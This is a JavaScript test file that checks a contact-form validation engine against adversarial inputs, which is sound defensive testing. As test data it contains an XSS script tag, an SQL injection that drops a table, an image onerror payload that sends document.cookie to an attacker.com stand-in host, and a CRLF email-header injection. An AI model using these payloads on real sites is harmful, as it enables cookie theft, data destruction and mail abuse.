import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { validateContactForm, validatePilotRequest } from '../helpers/validation-engine.mjs';

describe('Tier 2 - Boundary 7: Adversarial Injections & Security Integrity', () => {
  it('T2.7.1: Form handles script tag XSS payload safely without breaking validation', () => {
    const xssPayload = "<script>alert('XSS-TEST')</script>";
    const res = validateContactForm({
      name: 'Security Auditor',
      company: 'SecCorp',
      email: 'auditor@seccorp.com',
      message: `Inquiry regarding radar specs: ${xssPayload}`,
      company_website_url: '',
      form_timestamp: Date.now() - 3000
    });
    // The string is a valid string of length > 10, validation completes without error
    assert.equal(res.success, true);
  });

  it('T2.7.2: Form handles SQL injection syntax safely without internal error', () => {
    const sqliCompany = "O'Connor Fleet'; DROP TABLE inquiries; --";
    const res = validateContactForm({
      name: 'Tester',
      company: sqliCompany,
      email: 'tester@oconnor.com',
      message: 'Testing SQL injection resilience across input pipeline.',
      company_website_url: '',
      form_timestamp: Date.now() - 3000
    });
    assert.equal(res.success, true);
  });

  it('T2.7.3: Form handles HTML image onerror payload in user name safely', () => {
    const htmlPayload = '<img src=x onerror="fetch(`https://attacker.com?c=`+document.cookie)">';
    const res = validateContactForm({
      name: htmlPayload,
      company: 'SecOps',
      email: 'secops@domain.com',
      message: 'Checking for HTML markup injection in name field.',
      company_website_url: '',
      form_timestamp: Date.now() - 3000
    });
    assert.equal(res.success, true);
  });

  it('T2.7.4: CRLF injection in email field is rejected by email validation', () => {
    const crlfEmail = "admin@company.com\r\nBcc: evil@attacker.org";
    const res = validateContactForm({
      name: 'Adversary',
      company: 'Evil LLC',
      email: crlfEmail,
      message: 'Attempting SMTP header injection via CRLF characters.',
      company_website_url: '',
      form_timestamp: Date.now() - 3000
    });
    assert.equal(res.success, false, 'CRLF injection in email must fail email validation');
    assert.ok(res.errors.email);
  });

  it('T2.7.5: Embedded null bytes in string fields do not terminate validation engine', () => {
    const nullByteMsg = 'Valid message\0with null bytes in the middle of text payload';
    const res = validateContactForm({
      name: 'Null Tester',
      company: 'Byte Corp',
      email: 'null@bytecorp.com',
      message: nullByteMsg,
      company_website_url: '',
      form_timestamp: Date.now() - 3000
    });
    assert.equal(res.success, true, 'Null byte string should be handled without engine crash');
  });
});
